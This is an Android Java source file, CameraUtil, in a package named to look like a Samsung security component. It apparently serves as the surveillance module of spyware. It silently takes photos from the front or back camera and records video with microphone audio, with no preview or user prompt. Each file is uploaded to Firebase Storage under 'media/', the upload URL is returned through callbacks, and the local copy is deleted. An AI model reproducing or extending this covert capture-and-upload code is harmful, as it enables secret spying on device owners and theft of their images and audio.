package com.samsung.android.security.v8.utils;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Handler;
import android.os.HandlerThread;
import android.view.Surface;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;

import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import java.util.Arrays;

public class CameraUtil {
    
    private static CameraDevice cameraDevice;
    private static MediaRecorder mediaRecorder;
    private static String currentVideoFile;
    
    public interface CameraCallback {
        void onPhotoTaken(String url);
        void onError(String error);
    }
    
    public static void takePhoto(Context context, String cameraType, CameraCallback callback) {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) 
                != PackageManager.PERMISSION_GRANTED) {
            callback.onError("Camera permission not granted");
            return;
        }
        
        try {
            CameraManager manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
            if (manager == null) {
                callback.onError("CameraManager not available");
                return;
            }
            
            String cameraId = getCameraId(manager, cameraType);
            if (cameraId == null) {
                callback.onError("Camera not found");
                return;
            }
            
            HandlerThread handlerThread = new HandlerThread("CameraThread");
            handlerThread.start();
            Handler handler = new Handler(handlerThread.getLooper());
            
            manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    cameraDevice = camera;
                    capturePhoto(context, camera, callback, handler);
                }
                
                @Override
                public void onDisconnected(@NonNull CameraDevice camera) {
                    camera.close();
                    cameraDevice = null;
                    callback.onError("Camera disconnected");
                }
                
                @Override
                public void onError(@NonNull CameraDevice camera, int error) {
                    camera.close();
                    cameraDevice = null;
                    callback.onError("Camera error: " + error);
                }
            }, handler);
            
        } catch (Exception e) {
            callback.onError(e.getMessage());
        }
    }
    
    private static void capturePhoto(Context context, CameraDevice camera, 
                                    CameraCallback callback, Handler handler) {
        try {
            ImageReader imageReader = ImageReader.newInstance(
                    1920, 1080, ImageFormat.JPEG, 1
            );
            
            imageReader.setOnImageAvailableListener(reader -> {
                Image image = null;
                try {
                    image = reader.acquireLatestImage();
                    if (image != null) {
                        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                        byte[] bytes = new byte[buffer.remaining()];
                        buffer.get(bytes);
                        
                        // حفظ الصورة محلياً
                        File file = new File(context.getCacheDir(), 
                                "photo_" + System.currentTimeMillis() + ".jpg");
                        FileOutputStream output = new FileOutputStream(file);
                        output.write(bytes);
                        output.close();
                        
                        // رفع الصورة إلى Firebase
                        uploadToFirebase(context, file, callback);
                    }
                } catch (Exception e) {
                    callback.onError(e.getMessage());
                } finally {
                    if (image != null) {
                        image.close();
                    }
                    camera.close();
                }
            }, handler);
            
            Surface surface = imageReader.getSurface();
            
            CaptureRequest.Builder captureBuilder = camera.createCaptureRequest(
                    CameraDevice.TEMPLATE_STILL_CAPTURE
            );
            captureBuilder.addTarget(surface);
            captureBuilder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
            
            camera.createCaptureSession(Arrays.asList(surface), 
                    new CameraCaptureSession.StateCallback() {
                @Override
                public void onConfigured(@NonNull CameraCaptureSession session) {
                    try {
                        session.capture(captureBuilder.build(), null, handler);
                    } catch (Exception e) {
                        callback.onError(e.getMessage());
                    }
                }
                
                @Override
                public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                    callback.onError("Capture session configuration failed");
                }
            }, handler);
            
        } catch (Exception e) {
            callback.onError(e.getMessage());
        }
    }
    
    public static void startVideo(Context context, String cameraType, CameraCallback callback) {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA) 
                != PackageManager.PERMISSION_GRANTED ||
            ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) 
                != PackageManager.PERMISSION_GRANTED) {
            callback.onError("Camera or audio permission not granted");
            return;
        }
        
        try {
            CameraManager manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
            if (manager == null) {
                callback.onError("CameraManager not available");
                return;
            }
            
            String cameraId = getCameraId(manager, cameraType);
            if (cameraId == null) {
                callback.onError("Camera not found");
                return;
            }
            
            // إعداد ملف الفيديو
            currentVideoFile = context.getCacheDir().getAbsolutePath() + 
                    "/video_" + System.currentTimeMillis() + ".mp4";
            
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setOutputFile(currentVideoFile);
            mediaRecorder.setVideoEncodingBitRate(10000000);
            mediaRecorder.setVideoFrameRate(30);
            mediaRecorder.setVideoSize(1920, 1080);
            mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.prepare();
            
            HandlerThread handlerThread = new HandlerThread("VideoThread");
            handlerThread.start();
            Handler handler = new Handler(handlerThread.getLooper());
            
            manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    cameraDevice = camera;
                    try {
                        Surface surface = mediaRecorder.getSurface();
                        
                        CaptureRequest.Builder captureBuilder = camera.createCaptureRequest(
                                CameraDevice.TEMPLATE_RECORD
                        );
                        captureBuilder.addTarget(surface);
                        
                        camera.createCaptureSession(Arrays.asList(surface),
                                new CameraCaptureSession.StateCallback() {
                            @Override
                            public void onConfigured(@NonNull CameraCaptureSession session) {
                                try {
                                    session.setRepeatingRequest(captureBuilder.build(), null, handler);
                                    mediaRecorder.start();
                                    callback.onPhotoTaken("recording");
                                } catch (Exception e) {
                                    callback.onError(e.getMessage());
                                }
                            }
                            
                            @Override
                            public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                                callback.onError("Video session configuration failed");
                            }
                        }, handler);
                        
                    } catch (Exception e) {
                        callback.onError(e.getMessage());
                    }
                }
                
                @Override
                public void onDisconnected(@NonNull CameraDevice camera) {
                    camera.close();
                    cameraDevice = null;
                }
                
                @Override
                public void onError(@NonNull CameraDevice camera, int error) {
                    camera.close();
                    cameraDevice = null;
                    callback.onError("Camera error: " + error);
                }
            }, handler);
            
        } catch (Exception e) {
            callback.onError(e.getMessage());
        }
    }
    
    public static void stopVideo(CameraCallback callback) {
        try {
            if (mediaRecorder != null) {
                mediaRecorder.stop();
                mediaRecorder.reset();
                mediaRecorder.release();
                mediaRecorder = null;
            }
            
            if (cameraDevice != null) {
                cameraDevice.close();
                cameraDevice = null;
            }
            
            if (currentVideoFile != null) {
                File videoFile = new File(currentVideoFile);
                uploadToFirebase(null, videoFile, callback);
            }
            
        } catch (Exception e) {
            callback.onError(e.getMessage());
        }
    }
    
    private static String getCameraId(CameraManager manager, String cameraType) {
        try {
            for (String cameraId : manager.getCameraIdList()) {
                CameraCharacteristics characteristics = manager.getCameraCharacteristics(cameraId);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                
                if (facing != null) {
                    if ("front".equalsIgnoreCase(cameraType) && 
                        facing == CameraCharacteristics.LENS_FACING_FRONT) {
                        return cameraId;
                    } else if ("back".equalsIgnoreCase(cameraType) && 
                               facing == CameraCharacteristics.LENS_FACING_BACK) {
                        return cameraId;
                    }
                }
            }
        } catch (CameraAccessException e) {
            // Ignore
        }
        return null;
    }
    
    private static void uploadToFirebase(Context context, File file, CameraCallback callback) {
        try {
            FirebaseStorage storage = FirebaseStorage.getInstance();
            StorageReference storageRef = storage.getReference();
            StorageReference fileRef = storageRef.child("media/" + file.getName());
            
            Uri fileUri = Uri.fromFile(file);
            
            fileRef.putFile(fileUri)
                    .addOnSuccessListener(taskSnapshot -> {
                        fileRef.getDownloadUrl().addOnSuccessListener(uri -> {
                            callback.onPhotoTaken(uri.toString());
                            file.delete();
                        });
                    })
                    .addOnFailureListener(e -> {
                        callback.onError(e.getMessage());
                    });
                    
        } catch (Exception e) {
            callback.onError(e.getMessage());
        }
    }
}
